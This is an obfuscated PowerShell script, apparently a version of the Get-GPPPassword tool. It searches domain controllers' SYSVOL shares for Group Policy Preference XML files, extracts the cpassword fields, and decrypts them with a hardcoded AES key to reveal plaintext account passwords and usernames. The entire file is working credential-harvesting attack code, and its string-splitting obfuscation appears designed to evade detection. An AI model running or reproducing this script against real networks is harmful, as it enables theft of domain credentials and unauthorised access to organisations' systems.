  seT-iteM  ("VaRiab"+"le"+":"+"b07")  ([TYPe]("{1}{0}"-F 'NverT','Co') );   sET-vaRIable VZyg  ([TyPe]("{5}{2}{4}{0}{7}{1}{3}{6}" -F'X','N','T','IcOde','eM.tE','sYS','ENCODIng','t.u')  )  ;  sET-VARIable  ('2p'+'v')  (  [tyPE]("{12}{7}{11}{1}{8}{4}{9}{10}{5}{3}{0}{2}{6}{13}"-F'vedI','CtOrY','REcToR','es.AcTi','eR','C','Y','tEm.','s','V','i','DIRe','sYs','.DoMAiN')) ;function Get-`gP`pp`ASSwOrd 
{

    
    [CmdletBinding()]
    Param ()
    
    
    &("{1}{2}{0}"-f'rictMode','Set-S','t') -Version 2
    
    
    function GET`-DEcryp`TeDcp`A`Ss`word {
        [CmdletBinding()]
        Param (
            [string] ${C`P`AsSwoRD} 
        )

        try {
            
            ${m`Od} = (${C`P`ASsword}."l`ENGTH" % 4)
            
            switch (${M`oD}) {
            '1' {${CPa`SSW`ORD} = ${cP`Assw`ORD}.("{1}{0}{2}"-f 'tri','Subs','ng').Invoke(0,${C`PasS`Word}."lENG`Th" -1)}
            '2' {${C`Pa`ssWORd} += ('=' * (4 - ${M`OD}))}
            '3' {${cPa`s`SW`oRd} += ('=' * (4 - ${m`oD}))}
            }

            ${base64de`c`o`deD} =  (  GET-ChILdITEM  ("VaRIaB"+"LE"+":"+"b07"))."v`ALUE"::("{0}{2}{3}{1}{4}"-f'From','Strin','Base','64','g').Invoke(${CP`A`sSwOrd})
            
            
            ${AE`sObJ`ecT} = &("{3}{0}{2}{1}" -f 'ew-O','ject','b','N') ("{4}{11}{2}{3}{9}{8}{1}{6}{0}{10}{12}{5}{7}" -f'Cry','y','tem.Se','curit','Sy','rviceP','.Aes','rovider','tograph','y.Cryp','pt','s','oSe')
            [Byte[]] ${AE`s`kEY} = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
            
            ${A`E`sIv} = &("{0}{1}{2}"-f'New','-Ob','ject') ("{1}{0}" -f ']','Byte[')(${a`eSOBj`E`cT}."Iv"."l`E`NgTH") 
            ${A`Eso`BJECT}."i`V" = ${AE`s`Iv}
            ${ae`sO`BJECT}."k`Ey" = ${AeS`K`ey}
            ${D`ec`RyPt`O`ROBjEct} = ${Aes`o`BjecT}.("{1}{2}{4}{0}{3}" -f'rypto','C','reateD','r','ec').Invoke() 
            [Byte[]] ${OUtBLO`Ck} = ${DecRyPTO`R`ObJ`ECT}.("{2}{0}{4}{3}{1}"-f 'mFi','lock','Transfor','lB','na').Invoke(${B`Ase`64`dEcODeD}, 0, ${Base6`4dE`Co`ded}."LeN`gTh")
            
            return   ( VariABle  Vzyg)."val`UE"::"uNI`code"."Get`S`TRiNg"(${o`UtblOck})
        } 
        
        catch {&("{1}{0}{2}" -f 'ite-Err','Wr','or') ${eR`RoR}[0]}
    }  
    
    
    function g`eT-gPPINnE`Rf`IeldS {
    [CmdletBinding()]
        Param (
            ${f`Ile} 
        )
    
        try {
            
            ${FI`leN`Ame} = &("{1}{2}{0}" -f 'Path','Spl','it-') ${F`iLE} -Leaf
            [xml] ${X`Ml} = &("{2}{0}{1}{3}" -f 'et-C','o','G','ntent') (${Fi`Le})

            
            ${c`p`A`SSwOrD} = @()
            ${USE`Rna`Me} = @()
            ${neW`Na`Me} = @()
            ${chAN`G`Ed} = @()
            ${P`ASS`Word} = @()
    
            
            if (${x`ML}."In`NeRxML" -like ("{0}{2}{1}{3}" -f '*','as','cp','sword*')){
            
                &("{2}{1}{0}" -f 'ose','rite-Verb','W') ('Pote'+'nt'+'ial '+'p'+'asswor'+'d '+'in'+' '+"$File")
                
                switch (${fiLEN`A`mE}) {

                    ("{1}{2}{0}" -f 'l','Groups','.xm') {
                        ${C`PaSSWO`Rd} += , ${X`ml} | &("{1}{0}{2}"-f't-Xm','Selec','l') ("{2}{8}{1}{7}{6}{4}{5}{0}{3}"-f'ssw','ps/User/Pr','/Gro','ord','rties','/@cpa','pe','o','u') | &("{2}{0}{1}"-f 'ect','-Object','Sel') -Expand ("{1}{0}" -f'e','Nod') | &("{4}{1}{0}{2}{3}"-f 'Each-','or','Ob','ject','F') {${_}."VaL`Ue"}
                        ${UsE`R`NaME} += , ${x`mL} | &("{1}{2}{3}{0}" -f 'Xml','Se','le','ct-') ("{2}{6}{0}{5}{3}{9}{8}{1}{7}{4}" -f 'er/','@','/','oper','serName','Pr','Groups/Us','u','ies/','t') | &("{1}{0}{2}" -f'lect-Objec','Se','t') -Expand ("{0}{1}" -f 'N','ode') | &("{2}{3}{0}{1}" -f'e','ct','ForEach-Ob','j') {${_}."v`ALUe"}
                        ${neW`NA`Me} += , ${X`ML} | &("{2}{0}{1}" -f 'm','l','Select-X') ("{4}{6}{5}{3}{1}{2}{0}" -f'ies/@newName','/Prope','rt','/User','/G','s','roup') | &("{2}{3}{0}{1}" -f'bj','ect','Se','lect-O') -Expand ("{0}{1}" -f 'No','de') | &("{4}{0}{1}{2}{3}"-f 'orEac','h-','Ob','ject','F') {${_}."VA`luE"}
                        ${ChaN`geD} += , ${X`ML} | &("{0}{1}{2}"-f'Se','lec','t-Xml') ("{0}{3}{1}{4}{5}{2}"-f '/','Use','nged','Groups/','r/@ch','a') | &("{2}{4}{0}{1}{3}" -f '-','Obj','Se','ect','lect') -Expand ("{1}{0}" -f'ode','N') | &("{1}{0}{2}{4}{3}"-f 'Each','For','-O','ect','bj') {${_}."V`ALue"}
                    }
        
                    ("{0}{1}{2}"-f 'Se','rvices.x','ml') {  
                        ${CpA`SS`WORd} += , ${X`ml} | &("{1}{0}{2}"-f'ect-','Sel','Xml') ("{5}{2}{8}{0}{4}{6}{3}{7}{1}"-f 'i','d','TSer','rties/@cpassw','ces/NTService/Pr','/N','ope','or','v') | &("{2}{0}{1}"-f't','-Object','Selec') -Expand ("{0}{1}" -f 'No','de') | &("{3}{1}{2}{0}" -f'ect','rEach-O','bj','Fo') {${_}."V`AluE"}
                        ${u`se`RNAmE} += , ${x`ML} | &("{2}{1}{0}" -f'ml','-X','Select') ("{8}{9}{6}{10}{1}{4}{13}{12}{2}{3}{7}{5}{11}{0}" -f 'e','TS','opert','ies','ervi','ntN','erv','/@accou','/NT','S','ices/N','am','r','ce/P') | &("{2}{1}{3}{0}"-f 'ct','t-O','Selec','bje') -Expand ("{1}{0}" -f'de','No') | &("{3}{0}{2}{4}{1}" -f 'Eac','ct','h-','For','Obje') {${_}."v`Alue"}
                        ${C`H`AnGeD} += , ${X`ml} | &("{2}{1}{0}" -f '-Xml','lect','Se') ("{5}{0}{2}{6}{3}{8}{1}{7}{4}" -f 'S','hang','ervice','vice/','d','/NT','s/NTSer','e','@c') | &("{1}{0}{3}{2}"-f'ect-Ob','Sel','ct','je') -Expand ("{1}{0}"-f 'de','No') | &("{0}{1}{3}{4}{2}"-f'ForEa','ch-','ct','Obj','e') {${_}."V`ALUE"}
                    }
        
                    ("{2}{5}{4}{0}{1}{3}"-f'ledt','a','S','sks.xml','u','ched') {
                        ${c`PAs`SWoRd} += , ${X`ML} | &("{2}{3}{1}{0}"-f 't-Xml','c','Se','le') ("{2}{1}{0}{7}{6}{5}{3}{4}"-f'ks/Ta','Tas','/Scheduled','@','cpassword','erties/','Prop','sk/') | &("{1}{3}{0}{2}{4}"-f'ct','S','-Objec','ele','t') -Expand ("{0}{1}"-f'No','de') | &("{1}{0}{2}{3}{4}" -f'r','Fo','Each-','Ob','ject') {${_}."v`ALUe"}
                        ${u`SerNA`Me} += , ${x`mL} | &("{3}{0}{2}{1}" -f'elect','ml','-X','S') ("{4}{3}{7}{0}{2}{1}{8}{5}{6}"-f'uledT','ks/T','as','e','/Sch','k/Properties/@r','unAs','d','as') | &("{2}{0}{3}{4}{1}"-f 'elec','t','S','t-','Objec') -Expand ("{0}{1}"-f 'No','de') | &("{4}{1}{2}{3}{0}"-f 'ect','c','h-Ob','j','ForEa') {${_}."Va`Lue"}
                        ${ch`AN`GED} += , ${X`mL} | &("{2}{1}{0}" -f '-Xml','ect','Sel') ("{2}{4}{5}{6}{0}{3}{1}"-f'ask/@ch','ed','/Sched','ang','uled','Tas','ks/T') | &("{0}{2}{3}{1}" -f'Select','bject','-','O') -Expand ("{1}{0}" -f 'ode','N') | &("{2}{0}{1}"-f'ch-Ob','ject','ForEa') {${_}."V`ALuE"}
                    }
        
                    ("{2}{1}{3}{0}" -f'l','ataSources','D','.xm') { 
                        ${CpA`Ss`W`oRd} += , ${X`ML} | &("{3}{2}{0}{1}"-f 'ct-X','ml','ele','S') ("{8}{3}{1}{0}{6}{5}{4}{2}{7}" -f'ert','taSource/Prop','pas','urces/Da','c','/@','ies','sword','/DataSo') | &("{3}{2}{0}{1}"-f'e','ct','Obj','Select-') -Expand ("{0}{1}" -f'N','ode') | &("{1}{0}{3}{2}" -f 'ach-Ob','ForE','ect','j') {${_}."v`ALuE"}
                        ${u`s`eR`NAMe} += , ${x`ML} | &("{2}{0}{1}"-f'ect-X','ml','Sel') ("{2}{8}{1}{7}{4}{0}{5}{3}{9}{6}{10}" -f 'ataSour','u','/','r','es/D','ce/Prope','es/@userna','rc','DataSo','ti','me') | &("{2}{1}{0}" -f 'ct-Object','e','Sel') -Expand ("{1}{0}"-f 'de','No') | &("{0}{2}{1}" -f'ForEach-O','ject','b') {${_}."VAL`UE"}
                        ${c`h`AnGED} += , ${x`ML} | &("{2}{0}{1}"-f 'ct-','Xml','Sele') ("{6}{0}{1}{7}{2}{5}{3}{9}{8}{4}"-f 'urc','e','o','/@','nged','urce','/DataSo','s/DataS','a','ch') | &("{2}{0}{1}"-f 'lect-O','bject','Se') -Expand ("{0}{1}"-f'N','ode') | &("{3}{2}{1}{0}" -f 'ect','j','orEach-Ob','F') {${_}."va`LUe"}                          
                    }
                    
                    ("{3}{0}{1}{2}" -f 'nter','s','.xml','Pri') { 
                        ${C`pASSw`oRD} += , ${x`Ml} | &("{0}{2}{1}"-f 'Selec','l','t-Xm') ("{5}{10}{13}{1}{9}{7}{6}{4}{2}{0}{12}{3}{11}{8}"-f 'i','S','er/Propert','s','t','/P','rin','redP','d','ha','rinters','swor','es/@cpa','/') | &("{2}{0}{3}{4}{1}" -f'el','ct','S','ect-Obj','e') -Expand ("{1}{0}" -f 'ode','N') | &("{3}{0}{2}{1}" -f'e','t','c','ForEach-Obj') {${_}."V`AluE"}
                        ${UseRN`A`me} += , ${X`ML} | &("{1}{2}{3}{0}" -f'ml','Select','-','X') ("{0}{5}{6}{3}{1}{7}{4}{2}" -f'/','roperti','@username','er/P','/','Printers/Share','dPrint','es') | &("{1}{3}{0}{2}"-f'-Obje','Selec','ct','t') -Expand ("{1}{0}"-f 'ode','N') | &("{0}{2}{1}{3}"-f 'F','rE','o','ach-Object') {${_}."VaL`Ue"}
                        ${c`HAN`Ged} += , ${X`Ml} | &("{0}{2}{1}"-f 'S','Xml','elect-') ("{5}{1}{0}{7}{4}{6}{2}{3}"-f's','r','g','ed','Pr','/Printe','inter/@chan','/Shared') | &("{0}{1}{2}"-f'Se','lect-Obj','ect') -Expand ("{1}{0}" -f'de','No') | &("{1}{0}{2}"-f 'Eac','For','h-Object') {${_}."v`ALue"}
                    }
  
                    ("{1}{0}{2}"-f'ives.','Dr','xml') { 
                        ${cpa`S`SWO`RD} += , ${x`ML} | &("{3}{1}{0}{2}" -f 'lect-Xm','e','l','S') ("{3}{5}{2}{0}{4}{1}{6}"-f'P','operties/@cpa','/Drive/','/Dr','r','ives','ssword') | &("{2}{0}{3}{1}" -f'elec','ect','S','t-Obj') -Expand ("{1}{0}" -f 'e','Nod') | &("{0}{3}{1}{4}{2}" -f'ForEach-O','e','t','bj','c') {${_}."vA`lUE"}
                        ${Us`ERN`Ame} += , ${x`ml} | &("{2}{0}{1}"-f't','-Xml','Selec') ("{7}{2}{9}{0}{10}{8}{5}{3}{4}{1}{6}" -f'es/Dr','ernam','Dr','rties','/@us','e','e','/','op','iv','ive/Pr') | &("{0}{1}{3}{2}"-f'S','elect-Ob','ect','j') -Expand ("{0}{1}" -f'Nod','e') | &("{3}{0}{2}{1}"-f'ch-Ob','ct','je','ForEa') {${_}."V`AluE"}
                        ${C`h`ANgEd} += , ${X`ML} | &("{2}{0}{1}" -f 'elect','-Xml','S') ("{1}{3}{5}{2}{0}{4}"-f 'ange','/D','e/@ch','rives/Dr','d','iv') | &("{0}{2}{1}"-f'Select-O','ect','bj') -Expand ("{1}{0}"-f'e','Nod') | &("{0}{3}{2}{1}"-f'ForEach','ct','e','-Obj') {${_}."V`AlUE"} 
                    }
                }
           }
                     
           foreach (${p`ASs} in ${CPass`w`O`Rd}) {
               &("{1}{2}{0}"-f'-Verbose','Wri','te') ('Decr'+'ypt'+'ing'+' '+"$Pass")
               ${D`ecRyP`TE`Dp`AsSWord} = &("{1}{2}{5}{3}{0}{4}"-f 'ss','Get-D','ec','pa','word','ryptedC') ${pa`sS}
               &("{1}{4}{2}{3}{0}" -f 'se','Wri','-','Verbo','te') ('Decrypte'+'d'+' '+'a '+'passw'+'ord '+'of'+' '+"$DecryptedPassword")
               
               ${Pas`sWO`Rd} += , ${deCR`ypTedp`AS`SWOrd}
           }
            
            
            if (!(${P`A`SsWo`Rd})) {${pa`s`SwORD} = ("{0}{1}"-f'[BLAN','K]')}
            if (!(${Us`Ern`A`mE})) {${U`ser`NAmE} = ("{1}{0}"-f'BLANK]','[')}
            if (!(${c`HAnG`eD})) {${C`H`AnGEd} = ("{2}{1}{0}" -f'K]','AN','[BL')}
            if (!(${Ne`w`NaMe})) {${New`N`AmE} = ("{1}{0}{2}"-f 'B','[','LANK]')}
                  
            
            ${OBJ`ec`Tp`Ro`p`erties} = @{("{0}{1}" -f 'Password','s') = ${P`Ass`W`orD};
                                  ("{2}{1}{0}" -f 's','erName','Us') = ${US`ERn`AMe};
                                  ("{1}{0}" -f 'd','Change') = ${CHA`NgEd};
                                  ("{1}{2}{0}"-f 'e','Ne','wNam') = ${Newn`A`mE};
                                  ("{0}{1}" -f 'F','ile') = ${F`Ile}}
                
            ${rE`sUl`TSoBjE`cT} = &("{1}{2}{0}" -f'bject','New','-O') -TypeName ("{0}{1}{2}"-f'P','SOb','ject') -Property ${Ob`jE`C`TpROP`ertIes}
            &("{1}{0}{4}{3}{2}"-f'i','Wr','rbose','Ve','te-') "The password is between {} and may be more than one value."
            if (${r`E`sULtsOB`jeCT}) {Return ${rESulTso`BJ`eCT}} 
        }

        catch {&("{1}{0}{3}{2}"-f 'i','Wr','Error','te-') ${E`RrOR}[0]}
    }
    
    try {
        
        if ( ( ((&("{1}{0}{3}{2}" -f 'i','Get-Wm','t','Objec') ("{0}{1}{4}{2}{3}"-f 'W','in3','_Comput','erSystem','2'))."P`ARtoFDOma`in") -eq ${f`Al`SE} ) -or ( -not ${eNv:`USErDN`Sdom`Ain} ) ) {
            throw ("{12}{1}{13}{4}{8}{5}{0}{6}{10}{2}{14}{11}{9}{7}{3}"-f'ber or User','chine is n',' m','ain.','a doma','mem',' is not ','m','in ',' the do','a','of','Ma','ot ','ember ')
        }

        ${D`O`MaI`NCoNtrO`LlerS} = ( ( Get-iteM  ('VARI'+'AbL'+'e:'+'2pv')  )."V`ALUE"::("{0}{2}{1}{3}"-f 'Get','entD','Curr','omain').Invoke())."d`omai`Nc`on`TRoLlE`Rs" | .("{2}{3}{1}{0}" -f'ct','e','F','orEach-Obj') {${_}."na`Me"}
        .("{3}{1}{0}{2}{4}"-f 'te-V','ri','erb','W','ose') ('Dom'+'ain '+'con'+'t'+'roll'+'ers '+'for'+' '+'curr'+'en'+'t '+'domai'+'n:'+' '+"$DomainControllers")

        ${X`mlfi`leS} = @()
        foreach (${D`OmA`I`Nc`OnTrOLLER} in ${domai`NC`ONt`ROllErS}) {
            &("{2}{3}{0}{1}" -f'te-V','erbose','W','ri') ('Se'+'arching'+' '+"$DomainController")
            
            ${XmlF`Il`Es} += &("{2}{0}{1}{4}{3}" -f'et-','Chi','G','m','ldIte') -Path "\\$DomainController\SYSVOL" -Recurse -ErrorAction ("{1}{4}{2}{3}{0}" -f'inue','S','C','ont','ilently') -Include ("{0}{1}{2}{3}" -f 'G','ro','ups','.xml'),("{2}{3}{1}{0}"-f'ml','x','Servi','ces.'),("{0}{5}{2}{4}{1}{3}" -f'Sc','ks.','d','xml','uledtas','he'),("{0}{1}{3}{4}{2}" -f 'DataSourc','e','l','s.','xm'),("{3}{2}{0}{1}" -f'rs.x','ml','nte','Pri'),("{0}{2}{1}"-f 'Drives.','l','xm')
        }
        
        if ( -not ${X`mL`FilEs} ) {throw ("{0}{5}{3}{4}{2}{1}{6}" -f 'No',' files','ce','fere','n',' pre',' found.')}

        &("{2}{0}{1}" -f 'te','-Verbose','Wri') "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords. "
    
        foreach (${F`ILe} in ${X`mLfIl`Es}) {
            ${Re`sULT} = (.("{2}{0}{1}{5}{4}{3}" -f'-','GppIn','Get','s','Field','ner') ${f`ILe}."fuLL`N`AME")
            &("{0}{1}{3}{2}" -f'W','rite-','tput','Ou') ${R`Es`Ult}
        }
    }

    catch {.("{2}{1}{0}"-f 'e-Error','t','Wri') ${e`RROR}[0]}
}